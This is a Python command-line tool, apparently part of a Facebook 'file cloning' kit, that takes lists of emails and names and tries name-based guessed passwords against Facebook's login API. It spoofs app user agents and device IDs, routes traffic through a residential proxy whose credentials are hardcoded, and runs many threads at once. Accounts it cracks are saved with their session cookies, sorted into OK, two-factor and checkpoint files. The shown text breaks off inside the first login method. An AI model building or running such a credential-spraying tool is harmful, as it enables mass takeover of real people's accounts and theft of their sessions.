#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#----------------<-IMPORT-MODULE->----------------#
import os
import sys
import time
import random
import uuid
import json
import string
import base64
import hashlib
import urllib.request
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor as ThreadPool
try:
    import requests
except ImportError:
    os.system("pip install requests")
    import requests

G = "\033[1;92m"
W = "\x1b[38;5;15m"
B = "\033[1;34m"
Y = "\x1b[38;5;226m"
A = "\x1b[38;5;123m"
R = "\033[1;94m"  # تم التغيير من الأحمر إلى أزرق فاتح
O = "\x1b[38;5;81m"
X = "\x1b[38;5;205m"
P = "\x1b[10;95m"
BLUE_LIGHT = "\033[1;34m"
BLUE_DARK = "\033[0;34m"
BLUE_BRIGHT = "\033[1;94m"
CYAN = "\033[1;36m"

#----------------<-STYLE->----------------#
xp = f"{G}<[{W}●{G}]>{W}"
xp1 = f"{G}<[{W}1{G}]>{W}"
xp2 = f"{G}<[{W}2{G}]>{W}"
xp3 = f"{G}<[{W}3{G}]>{W}"
xp4 = f"{G}<[{W}4{G}]>{W}"
xp5 = f"{G}<[{W}5{G}]>{W}"
xp0 = f"{G}<[{W}0{G}]>{W}"
xpx = f"{G}<[{W}?{G}]>{W}"
xpxx = f"{G}>{W}>{G}>{W}"

#----------------<-PROXY CONFIGURATION->----------------#
PROXY_USERNAME = "geonode_pnptdRU86u-type-residential"
PROXY_PASSWORD = "78ee087d-ae07-4d30-9a76-c89b989b6fe3"
PROXY_DNS = "proxy.geonode.io:9000"
PROXY_URL = f"http://{PROXY_USERNAME}:{PROXY_PASSWORD}@{PROXY_DNS}"
PROXY = {"http": PROXY_URL, "https": PROXY_URL}

#----------------<-MODELS LIST FROM GITHUB->----------------#
MODELS_LIST = []
MODELS_LOADED = False

def load_models_from_github():
    global MODELS_LIST, MODELS_LOADED
    try:
        models_url = "https://github.com/pubgcvb780-pixel/welcome-audio/raw/refs/heads/main/model.txt"
        response = requests.get(models_url, timeout=10, proxies=PROXY)
        if response.status_code == 200:
            MODELS_LIST = [line.strip() for line in response.text.splitlines() if line.strip()]
            MODELS_LOADED = True
            return True
    except Exception as e:
        pass
    
    # Fallback models if download fails
    MODELS_LIST = [
        "SM-G313ML", "GT-I9195", "SM-T530", "SM-J200F", 
        "SM-J200G", "GT-I9060I"
    ]
    MODELS_LOADED = True
    return False

#----------------<-CLEAR->----------------#
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

clear_screen()

#----------------<-INTERNET->----------------#
try:
    requests.get("https://www.google.com", timeout=5)
except:
    clear_screen()
    print(f"{xp} NO INTERNET CONNECTION & DON'T TRY TO BYPASS")
    print(f"{G}━" * 56)
    sys.exit()

#----------------<-FILE-PATH->----------------#
sd_folder = os.path.join(os.getcwd(), "PS-Results")
sea_folders = ("RANDOM", "FILE")
os.makedirs(sd_folder, exist_ok=True)
for folder in sea_folders:
    os.makedirs(os.path.join(sd_folder, folder), exist_ok=True)

sdcard_folder = "/sdcard/PS-"
try:
    os.makedirs(sdcard_folder, exist_ok=True)
    for folder in sea_folders:
        os.makedirs(os.path.join(sdcard_folder, folder), exist_ok=True)
except:
    pass

#----------------<-DATE->----------------#
__dic__ = {
    '1': 'JANUARY', '2': 'FEBRUARY', '3': 'MARCH', '4': 'APRIL',
    '5': 'MAY', '6': 'JUNE', '7': 'JULY', '8': 'AUGUST',
    '9': 'SEPTEMBER', '10': 'OCTOBER', '11': 'NOVEMBER', '12': 'DECEMBER'
}
__now__ = datetime.now()
__days__ = __now__.day
__months__ = __dic__[str(__now__.month)]
__years__ = __now__.year
__date__ = f'{W}{__days__}{G}/{W}{__months__}{G}/{W}{__years__}'

#----------------<-COUNTRY->----------------#
try:
    ip = requests.get("https://api.ipify.org", timeout=5, proxies=PROXY).text
    ip_info = requests.get(f"http://ip-api.com/json/{ip}", timeout=5, proxies=PROXY)
    af = json.loads(ip_info.text)
    __COUNTRYS__ = af.get('country', 'UNKNOWN').upper()
except:
    __COUNTRYS__ = "UNKNOWN"

#----------------<-VERSION->----------------#
try:
    versn = requests.get("https://raw.githubusercontent.com/NOOR-404/Control-room/main/VERSION", timeout=5).text.strip()
    version = str(versn)
except:
    version = "3.0"

#----------------<-LINE FUNCTION->----------------#
def __LINE__():
    print(f"{G}━" * 56)

#----------------<-LOGO->----------------#
version ='2.0'
#----------------\<-SHORT->/----------------#
xlinex = (f"{R}━"*56)
#----------------\<-LOGO->/----------------#
logo = f"""
{R}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
{R}⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
{R}╭━━━┳━━━╮
{R}┃╭━╮┃╭━╮┃
{R}┃╰━╯┃╰━━╮
{R}┃╭━━┻━━╮┃
{R}┃┃╱╱┃╰━╯┃
{R}╰╯╱╱╰━━━╯
{xlinex}
{W}  DEVELOPER {xpxx} PS{G}-{W}
{W}  STATUS    {xpxx} Premium
{W}  VERSION   {xpxx} V{G}/{W}{version}
{xlinex}
{R}⫷⫸ 𝐷𝐸𝑉 𝑃𝑆 | @p7s7s ⫷⫸
{xlinex}
{xp} FUTURES  {xpxx} FILE{G}〤{W}CLONE
{xp} DEV {xpxx} PS ~ p7s7s
{xp} TODAYS   {xpxx} {__date__}
{xlinex}"""


#----------------<-UA-NORMAL-MIX (MODIFIED TO USE MODELS)->----------------#
def _____UpDaTe_S1_____():
    global MODELS_LIST
    if not MODELS_LOADED:
        load_models_from_github()
    
    fbav3 = f'{random.randint(300, 500)}.{random.randint(0, 1)}.{random.randint(0, 1)}.{random.randint(50, 150)}.{random.randint(100, 300)}'
    fbbv3 = str(random.randint(300000000, 999999999))
    density3 = random.choice(['1.5', '2.0', '2.5', '3.0'])
    width3 = random.choice(['720', '1080', '1440'])
    height3 = random.choice(['1600', '1920', '2340', '2560'])
    fblc3 = random.choice(["en_US", "en_GB", "es_ES", "fr_FR", "ar_SA", "bn_BD", "pt_BR", "de_DE"])
    fbrv3 = str(random.randint(400000000, 999999999))
    fbcr3 = random.choice(["Verizon", "AT&T", "T-Mobile", "Vodafone", "Orange", "O2", "EE", "Three"])
    
    # استخدام النماذج المحملة من GitHub
    if MODELS_LIST:
        fbdv3 = random.choice(MODELS_LIST)
        # تحديد العلامة التجارية بناءً على الموديل
        if fbdv3.startswith("SM-"):
            fbmf3 = "samsung"
        elif fbdv3.startswith("GT-"):
            fbmf3 = "samsung"
        else:
            fbmf3 = random.choice(['samsung', 'xiaomi', 'oneplus', 'google'])
    else:
        fbdv3 = random.choice(['SM-G991B', 'SM-G998B', '2107113SG', 'KB2001', 'Pixel 6', 'Pixel 7'])
        fbmf3 = random.choice(['samsung', 'xiaomi', 'oneplus', 'google'])
    
    fbbd3 = fbmf3
    fbsv3 = f'{random.randint(11, 14)}.{random.randint(0, 5)}.{random.randint(1, 5)}'
    fb3 = random.choice(['com.facebook.katana|FB4A','com.facebook.orca|Orca-Android'])
    fban3 = fb3.split('|')[1]
    fbpn3 = fb3.split('|')[0]
    bit3 = random.choice(['FBOP/19;FBCA/armeabi-v7a:armeabi;]','FBOP/1;FBCA/arm64-v8a:;]'])
    ___Noor_on_Fire___ = '[FBAN/' + str(fban3) + ';FBAV/' + str(fbav3) + ';FBBV/' + str(fbbv3) + ';FBDM/{density=' + str(density3) + ',width=' + str(width3) + ',height=' + str(height3) + '};FBLC/' + str(fblc3) + ';FBRV/' + str(fbrv3) + ';FBCR/' + str(fbcr3) + ';FBMF/' + str(fbmf3) + ';FBBD/' + str(fbbd3) + ';FBPN/' + str(fbpn3) + ';FBDV/' + str(fbdv3) + ';FBSV/' + str(fbsv3) + ';' + str(bit3) + ''
    return ___Noor_on_Fire___

def _____UpDaTe_S2_____():
    global MODELS_LIST
    if not MODELS_LOADED:
        load_models_from_github()
    
    fbav3 = f'{random.randint(300, 500)}.{random.randint(0, 1)}.{random.randint(0, 1)}.{random.randint(50, 150)}.{random.randint(100, 300)}'
    fbbv3 = str(random.randint(300000000, 999999999))
    density3 = random.choice(['1.5', '2.0', '2.5', '3.0'])
    width3 = random.choice(['720', '1080', '1440'])
    height3 = random.choice(['1600', '1920', '2340', '2560'])
    fblc3 = random.choice(["en_US", "en_GB", "es_ES", "fr_FR", "ar_SA", "bn_BD", "pt_BR", "de_DE"])
    fbrv3 = str(random.randint(400000000, 999999999))
    fbcr3 = random.choice(["Verizon", "AT&T", "T-Mobile", "Vodafone", "Orange", "O2", "EE", "Three"])
    
    # استخدام النماذج المحملة من GitHub
    if MODELS_LIST:
        fbdv3 = random.choice(MODELS_LIST)
        if fbdv3.startswith("SM-"):
            fbmf3 = "samsung"
        elif fbdv3.startswith("GT-"):
            fbmf3 = "samsung"
        else:
            fbmf3 = random.choice(['samsung', 'xiaomi', 'oneplus', 'google'])
    else:
        fbdv3 = random.choice(['SM-G991B', 'SM-G998B', '2107113SG', 'KB2001', 'Pixel 6', 'Pixel 7'])
        fbmf3 = random.choice(['samsung', 'xiaomi', 'oneplus', 'google'])
    
    fbbd3 = fbmf3
    fbsv3 = f'{random.randint(11, 14)}.{random.randint(0, 5)}.{random.randint(1, 5)}'
    fb3 = random.choice(['com.facebook.katana|FB4A','com.facebook.orca|Orca-Android'])
    fban3 = fb3.split('|')[1]
    fbpn3 = fb3.split('|')[0]
    bit3 = random.choice(['FBOP/19;FBCA/armeabi-v7a:armeabi;]','FBOP/1;FBCA/arm64-v8a:;]'])
    agent3 = '[FBAN/' + str(fban3) + ';FBAV/' + str(fbav3) + ';FBBV/' + str(fbbv3) + ';FBDM/{density=' + str(density3) + ',width=' + str(width3) + ',height=' + str(height3) + '};FBLC/' + str(fblc3) + ';FBRV/' + str(fbrv3) + ';FBCR/' + str(fbcr3) + ';FBMF/' + str(fbmf3) + ';FBBD/' + str(fbbd3) + ';FBPN/' + str(fbpn3) + ';FBDV/' + str(fbdv3) + ';FBSV/' + str(fbsv3) + ';' + str(bit3) + ''
    iphone3 = random.choice([
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/650374106;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/652879078;IABMV/1]',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D72 [FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/699723644;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/701797973;IABMV/1]',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20H350 [FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/696635672;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/700448384;IABMV/1]',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D82 [FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/707243085;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/0;IABMV/1]',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20F75 [FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/704769221;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/708017881;IABMV/1]'
    ])
    ___Noor_on_Fire___ = '' + str(iphone3) + ' ' + str(agent3)
    return ___Noor_on_Fire___

#----------------<-UA-ANDROID (ALREADY USING MODELS)->----------------#
def _____UpDaTe_S3_____():
    global MODELS_LIST
    if not MODELS_LOADED:
        load_models_from_github()
    
    android_versions = ["10", "11", "12", "13", "14"]
    
    # Use models from the loaded list
    if MODELS_LIST:
        device = random.choice(MODELS_LIST)
    else:
        device = "SM-G991B"
    
    # Extract brand from device model (simple extraction)
    if device.startswith("SM-"):
        brand = "Samsung"
    elif device.startswith("GT-"):
        brand = "Samsung"
    else:
        brand = random.choice(["Samsung", "Xiaomi", "OnePlus", "Google"])
    
    android = random.choice(android_versions)
    fbav = f"{random.randint(200,400)}.0.0.{random.randint(1,200)}.{random.randint(1,150)}"
    fbbv = random.randint(100000000,999999999)
    width = random.choice([720, 1080, 1440])
    height = random.choice([1600, 1920, 2172, 2400])
    density = random.choice([2.0, 2.5, 3.0, 4.0])
    ___Noor_on_Fire___ = f"""Dalvik/2.1.0 (Linux; U; Android {android}; {device} Build/UP1A.231005.007) [FBAN/ViewpointsForAndroid;FBAV/{fbav};FBBV/{fbbv};FBRV/0;FBPN/com.facebook.viewpoints;FBLC/ar_AR;FBMF/{brand};FBBD/{brand};FBDV/{device};FBSV/{android};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{{density={density},width={width},height={height}}};FB_FW/1;]"""
    return ___Noor_on_Fire___

#----------------<-PS CLASS->----------------#
class __SEAXNOOR__:
    def __init__(self) -> None:
        self.loop = 0
        self.oks = []
        self.cps = []
        self.sea = []
        self.nvs = []
        self.twf = []
        self.gen = []
        self.plist = []
        self.__COOKIE__ = []
        self.__CP__ = []
        self.__LOCK__ = []

    #----------------<-MAIN-MENU->----------------#
    def __MENU__(self) -> None:
        clear_screen()
        print(logo)
        __LINE__()
        print(f"{xp1} {O}FILE CLONING ")
        print(f"{xp5} {O}DOWNLOAD PROXY/MODEL FROM GITHUB ")
        print(f"{xp0} {O}EXIT TOOLS ")
        __LINE__()
        __MENUC__ = input(f"{xpx} {R}INPUT MENU {xpxx} ")
        if __MENUC__ == "1":
            self.__FILEX__()
        elif __MENUC__ == "5":
            self.__DOWNLOAD_FILES__()
        elif __MENUC__ == "0":
            __LINE__()
            print(f"{xp} {R}EXIT SUCCESSFULLY ")
            time.sleep(1.1)
            __LINE__()
            sys.exit()
        else:
            __LINE__()
            print(f"{xp} {R}INVALID OPTION TRY AGAIN ")
            time.sleep(1)
            self.__MENU__()

    #----------------<-DOWNLOAD FILES FROM GITHUB->----------------#
    def __DOWNLOAD_FILES__(self):
        clear_screen()
        print(logo)
        __LINE__()
        print(f"{xp} {O}DOWNLOAD FILES FROM GITHUB")
        __LINE__()
        print(f"{xp1} {O}Download Proxy List (proxies.txt)")
        print(f"{xp2} {O}Download Model List (models.txt)")
        print(f"{xp0} {O}Back to Main Menu")
        __LINE__()
        choice = input(f"{xpx} {R}INPUT CHOICE {xpxx} ")
        
        if choice == "1":
            url = "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
            filename = "proxies.txt"
        elif choice == "2":
            url = "https://github.com/pubgcvb780-pixel/welcome-audio/raw/refs/heads/main/model.txt"
            filename = "models.txt"
        elif choice == "0":
            self.__MENU__()
            return
        else:
            print(f"{xp} {R}Invalid choice!")
            time.sleep(1)
            self.__DOWNLOAD_FILES__()
            return
            
        try:
            print(f"{xp} {O}Downloading from {url}...")
            response = requests.get(url, timeout=30, proxies=PROXY)
            with open(filename, 'w') as f:
                f.write(response.text)
            print(f"{xp} {G}Successfully downloaded to {filename}")
            __LINE__()
            input(f"{xpx} {R}Press Enter to continue...")
            self.__DOWNLOAD_FILES__()
        except Exception as e:
            print(f"{xp} {R}Download failed: {str(e)}")
            time.sleep(2)
            self.__DOWNLOAD_FILES__()

    #----------------<-FILE-MENU->----------------#
    def __FILEX__(self) -> None:
        # Load models before starting
        load_models_from_github()
        
        clear_screen()
        print(logo)
        print(f"{xp} EXAMPLE  {xpxx} {G}/{W}ids.txt (format: email|name)")
        print(f"{xp} SDCARD PATH {xpxx} {G}/{W}/sdcard/ids.txt")
        __LINE__()
        __fileloX__ = input(f"{xpx} {R}INPUT FILE PATH {xpxx} ")
        try:
            if not __fileloX__.startswith("/") and not __fileloX__.startswith("./"):
                __fileXX__ = os.path.join(os.getcwd(), __fileloX__)
                if not os.path.exists(__fileXX__):
                    __fileXX__ = f"/sdcard/{__fileloX__}"
            else:
                __fileXX__ = __fileloX__
            with open(__fileXX__, 'r', encoding='utf-8', errors='ignore') as f:
                __fileckX__ = f.read().splitlines()
        except FileNotFoundError:
            __LINE__()
            print(f"{xp} {R}FILE NOT FOUND TRY AGAIN ")
            time.sleep(1.2)
            self.__FILEX__()
            return
        except Exception as e:
            __LINE__()
            print(f"{xp} {R}ERROR: {str(e)} ")
            time.sleep(1.2)
            self.__FILEX__()
            return

        clear_screen()
        print(logo)
        print(f"{xp1} {R}METHOD 1 (Graph)")
        print(f"{xp2} {R}METHOD 2 (B-Graph)")
        print(f"{xp3} {R}METHOD 3 (API)")
        print(f"{xp4} {R}METHOD 4 (B-API)")
        print(f"{xp5} {R}METHOD 5 (Android API) {G}[NEW]")
        __LINE__()
        __METHODF__ = input(f"{xpx} {R}INPUT METHOD {xpxx} ")

        clear_screen()
        print(logo)
        print(f"{xp1} {R}AUTO PASSLIST ")
        print(f"{xp2} {R}CUSTOM PASSLIST ")
        __LINE__()
        __PASLISTF__ = input(f"{xpx} {R}INPUT PASSLIST {xpxx} ")

        if __PASLISTF__ == "1":
            clear_screen()
            print(logo)
            print(f"{xp1} {R}AUTO BASIC PASSLIST ")
            print(f"{xp2} {R}AUTO WEAK PASSLIST ")
            print(f"{xp3} {R}AUTO STRONG PASSLIST ")
            print(f"{xp4} {R}AUTO MIX PASSLIST ")
            __LINE__()
            __COUNTRYPAS__ = input(f"{xpx} {R}INPUT PASSLIST {xpxx} ")
            
            if __COUNTRYPAS__ == "1":
                self.plist.extend(["firstlast", "first12", "@1234@", "@123456@", "first2025", "@@@###", "@@@@####", "first098", "first112233", "000999", "first321", "first10", "first@1212", "first4321", "first25", "22558800", "77889900", "first@#", "99887766", "09876543"])
            elif __COUNTRYPAS__ == "2":
                self.plist.extend(["first123", "first@1234", "first@12345", "first786", "first110", "firstlast", "firstlast12", "firstlast123", "firstlast12345", "first@123", "last123", "last12345"])
            elif __COUNTRYPAS__ == "3":
                self.plist.extend(["firstlast", "first last", "first123", "57273200", "59039200", "234567", "708090", "firstlast123", "firstlast1234", "first123", "first2025", "first@", "first@@", "57273200"])
            elif __COUNTRYPAS__ == "4":
                self.plist.extend(["first123", "first12345", "first@123", "first@1234", "first last", "firstlast123", "firstlast@123", "first last123", "first123456789", "first123@", "first123@@", "first12345@"])
            else:
                self.plist.extend(["first first", "first last", "first123", "last last", "last first", "first1234", "first12345", "first123456", "first 123", "first 1234", "first 12345", "first 123456", "first 1234567", "first 12", "first12", "first@123", "first#123", "first_123", "first-123", "first.last", "first123!", "first@2024", "first#2024", "first_2024"])
        else:
            try:
                clear_screen()
                print(logo)
                print(f"{xp} {R}PASSLIST LIMIT 5{G}/{W}20")
                __LINE__()
                __PASSFM__ = int(input(f"{xpx} {R}PASSLIST LIMIT {xpxx} "))
                if __PASSFM__ > 20:
                    __PASSFM__ = 20
            except:
                __PASSFM__ = 5

            clear_screen()
            print(logo)
            print(f"{xp} {R}EXAMPLE  {xpxx} firstlast {G}/{W} first12 {G}/{W} first123 ")
            __LINE__()
            for i in range(__PASSFM__):
                self.plist.append(input(f"{xp} {R}ENTER PASSLIST {G}<[{W}{i+1}{G}]> {xpxx} "))

        clear_screen()
        print(logo)
        print(f"{xp1} {R}AUTO SPEED {G}<[{W}30{G}]> ")
        print(f"{xp2} {R}CUSTOM SPEED ")
        __LINE__()
        __SPEED__ = input(f"{xpx} {R}INPUT SPEED {xpxx} ")

        if __SPEED__ == "1":
            __MAXX__ = 30
        else:
            try:
                clear_screen()
                print(logo)
                print(f"{xp} {R}MAXIMUM SPEED LIMIT 30-60 ")
                __LINE__()
                __MAXX__ = int(input(f"{xpx} {R}INPUT SPEED {xpxx} "))
                if __MAXX__ > 60:
                    __MAXX__ = 60
                elif __MAXX__ < 30:
                    __MAXX__ = 30
            except ValueError:
                __MAXX__ = 30

        clear_screen()
        print(logo)
        print(f"{xp} {R}DO YOU WANT TO SHOW COOKIE...? ")
        __LINE__()
        __co__ = input(f"{xpx} {B}Y{G}/{R}N {xpxx} ")
        clear_screen()
        print(logo)
        print(f"{xp} {R}DO YOU WANT TO SHOW CP{G}/{W}2F IDS...? ")
        __LINE__()
        __cps__ = input(f"{xpx} {B}Y{G}/{R}N {xpxx} ")

        self.__COOKIE__.append('y' if __co__.lower() in ['y', 'yes', '1'] else 'n')
        self.__CP__.append('y' if __cps__.lower() in ['y', 'yes', '1'] else 'n')

        with ThreadPool(max_workers=__MAXX__) as __SEA__:
            clear_screen()
            print(logo)
            total_ids = str(len(__fileckX__))
            print(f"[/] {R}TOTAL{G}/{W}IDS {xpxx} {total_ids} ")
            print(f"{xp} {R}IF NO RESULT ON{G}/{W}OFF AIRPLANE MODE")
            __LINE__()
            for user in __fileckX__:
                try:
                    ids, names = user.split('|')
                except ValueError:
                    continue
                passlist = self.plist
                if __METHODF__ == "1":
                    __SEA__.submit(self.__M1X__, ids, names, passlist)
                elif __METHODF__ == "2":
                    __SEA__.submit(self.__M2X__, ids, names, passlist)
                elif __METHODF__ == "3":
                    __SEA__.submit(self.__M3X__, ids, names, passlist)
                elif __METHODF__ == "4":
                    __SEA__.submit(self.__M4X__, ids, names, passlist)
                elif __METHODF__ == "5":
                    __SEA__.submit(self.__M5X__, ids, names, passlist)
                else:
                    __SEA__.submit(self.__M1X__, ids, names, passlist)

        print("\033[1;37m")
        __LINE__()
        print(f"{xp} THE PROCESS HAS COMPLETED...!")
        print(f"{xp} TOTAL OK{G}/{W}2F{G}/{W}CP {xpxx}{B} {len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}")
        __LINE__()
        print(f"{xp} THANKS FOR USING.....! ")
        sys.exit()

    #----------------<-IMPROVED CHECK RESPONSE->----------------#
    def _check_response(self, po, ids, pas, method):
        """تحسين اكتشاف النتائج - الأولوية: OK > 2FA > CP > FAIL"""
        
        # التحقق من أن الاستجابة هي قاموس JSON صالح
        if not isinstance(po, dict):
            return 'fail', po

        # ========== 1. التحقق من OK (تسجيل دخول ناجح) ==========
        if 'session_key' in po and 'access_token' in po and 'session_cookies' in po:
            return 'ok', po

        # ========== 2. التحقق من 2FA (المصادقة الثنائية) ==========
        if 'error' in po:
            error_data = po.get('error', {})
            error_message = error_data.get('message', '').lower()
            error_code = error_data.get('code')
            
            if ('two-factor' in error_message or 'login approval' in error_message or 'approval code' in error_message or 'code sent' in error_message) and error_code in [400, 401, 403, 405]:
                return '2f', po
            if 'error_data' in error_data and 'login_approval_required' in error_data.get('error_data', {}):
                return '2f', po

        # ========== 3. التحقق من CP (نقطة تفتيش/حظر حساب) ==========
        if 'error' in po:
            error_data = po.get('error', {})
            error_message = error_data.get('message', '').lower()
            error_code = error_data.get('code')
            
            if ('checkpoint' in error_message or 'account locked' in error_message or 'unusual activity' in error_message or 'security check' in error_message or 'confirm your identity' in error_message) and error_code in [400, 401, 403, 405]:
                return 'cp', po
            if 'error_data' in error_data and 'checkpoint_required' in error_data.get('error_data', {}):
                return 'cp', po

        # ========== 4. فشل ==========
        return 'fail', po

    def _save_results(self, ids, pas, cookie, result_type, method):
        """حفظ النتائج في كلا المسارين"""
        if result_type == 'ok':
            with open(os.path.join(sd_folder, 'FILE', f'SEA-{method}-OK.txt'), 'a') as f:
                f.write(ids + '/' + pas + '/' + cookie + '\n')
            try:
                with open(os.path.join(sdcard_folder, 'FILE', f'PS-{method}-OK.txt'), 'a') as f:
                    f.write(ids + '/' + pas + '/' + cookie + '\n')
            except:
                pass
        elif result_type == '2f':
            with open(os.path.join(sd_folder, 'FILE', f'SEA-{method}-2F.txt'), 'a') as f:
                f.write(ids + '/' + pas + '\n')
            try:
                with open(os.path.join(sdcard_folder, 'FILE', f'PS-{method}-2F.txt'), 'a') as f:
                    f.write(ids + '/' + pas + '\n')
            except:
                pass
        elif result_type == 'cp':
            with open(os.path.join(sd_folder, 'FILE', f'SEA-{method}-CP.txt'), 'a') as f:
                f.write(ids + '/' + pas + '\n')
            try:
                with open(os.path.join(sdcard_folder, 'FILE', f'PS-{method}-CP.txt'), 'a') as f:
                    f.write(ids + '/' + pas + '\n')
            except:
                pass

    #----------------<-FILE-M1-GRAPH (MODIFIED)->----------------#
    def __M1X__(self, ids, names, passlist):
        retry_count = 0
        max_retries = 2
        
        while retry_count <= max_retries:
            try:
                color = random.choice([
                    "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                    "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                    "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                ])
                sys.stdout.write(
                    f'\r{xp}{W}-{G}<[{W}PS{G}-{W}{G}]>>{W}-{G}<<[{color}{self.loop}{G}+{W}M1{G}]>>{W}--{G}<<[{G}{len(self.oks)}{G}+{Y}{len(self.twf)}{G}+{P}{len(self.cps)}{G}]> '
                )
                sys.stdout.flush()

                fn = names.split(' ')[0]
                try:
                    ln = names.split(' ')[1]
                except:
                    ln = fn

                for pw in passlist:
                    pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
                    ua = _____UpDaTe_S1_____()  # الآن تستخدم النماذج المحملة
                    accessToken = random.choice([
                        '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        '256002347743983|374e60f8b9bb6b8cbb30f78030438895'
                    ])
                    random_seed = random.Random()
                    pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                    adid = ''.join(random_seed.choices(string.hexdigits, k=16))
                    device_id = str(uuid.uuid4())
                    __locale__ = {
                        "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
                        "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE", "pt_BR": "BR"
                    }
                    country_locale = random.choice(list(__locale__.keys()))
                    country_code = __locale__[country_locale]
                    data = {
                        "adid": adid,
                        "format": "json",
                        "device_id": device_id,
                        "cpl": "true",
                        "family_device_id": str(uuid.uuid4()),
                        "credentials_type": "device_based_login_password",
                        "error_detail_type": "button_with_disabled",
                        "source": "device_based_login",
                        "email": ids,
                        "password": f"#{pax}:0:{int(time.time())}:{pas}",
                        "access_token": accessToken,
                        "generate_session_cookies": "1",
                        "advertiser_id": str(uuid.uuid4()),
                        "currently_logged_in_userid": "0",
                        "locale": country_locale,
                        "client_country_code": country_code,
                        "method": "auth.login",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        "api_key": "882a8490361da98702bf97a021ddc14d"
                    }
                    headers = {
                        "User-Agent": ua,
                        "Accept-Encoding": "gzip, deflate",
                        "Accept": "*/*",
                        "Connection": "keep-alive",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Host": "graph.facebook.com",
                        "X-FB-Net-HNI": str(random.randint(11111, 99999)),
                        "X-FB-SIM-HNI": str(random.randint(11111, 99999)),
                        "X-FB-Connection-Type": random.choice(["CELL.4G", "WIFI", "MOBILE.LTE", "CELL.5G"]),
                        "X-Tigon-Is-Retry": "False",
